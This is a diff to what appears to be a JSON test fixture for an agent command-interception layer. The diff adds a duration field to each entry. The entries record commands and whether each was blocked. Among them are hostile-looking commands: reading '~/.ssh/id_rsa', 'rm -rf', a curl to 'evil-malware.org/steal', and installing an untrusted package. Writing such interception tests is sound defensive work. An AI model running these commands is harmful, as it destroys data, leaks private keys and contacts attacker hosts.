@@ -8,6 +8,7 @@
     "tool_name": "workspace_exec",
     "command": "go test ./...",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": false
   },
   {
@@ -19,6 +20,7 @@
     "tool_name": "workspace_exec",
     "command": "rm -rf /tmp/data",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -30,6 +32,7 @@
     "tool_name": "workspace_exec",
     "command": "cat ~/.ssh/id_rsa",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -41,6 +44,7 @@
     "tool_name": "workspace_exec",
     "command": "curl https://evil-malware.org/steal",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -52,6 +56,7 @@
     "tool_name": "workspace_exec",
     "command": "curl https://api.github.com/repos",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": false
   },
   {
@@ -63,6 +68,7 @@
     "tool_name": "workspace_exec",
     "command": "sh -c 'echo bypassed'",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -74,6 +80,7 @@
     "tool_name": "workspace_exec",
     "command": "cat file.txt | grep error \u003e out.txt",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": false
   },
   {
@@ -85,6 +92,7 @@
     "tool_name": "workspace_exec",
     "command": "pip install untrusted-pkg",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -96,6 +104,7 @@
     "tool_name": "workspace_exec",
     "command": "sleep 100",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -107,6 +116,7 @@
     "tool_name": "workspace_exec",
     "command": "cat big_file.txt",
     "backend": "workspaceexec",
+    "duration_ms": 0,
     "intercepted": false
   },
   {
@@ -118,6 +128,7 @@
     "tool_name": "host_exec",
     "command": "sudo chmod +x /usr/bin/tool",
     "backend": "hostexec",
+    "duration_ms": 0,
     "intercepted": true
   },
   {
@@ -129,6 +140,7 @@
     "tool_name": "host_exec",
     "command": "go vet ./...",
     "backend": "hostexec",
+    "duration_ms": 0,
     "intercepted": false
   }
 ]
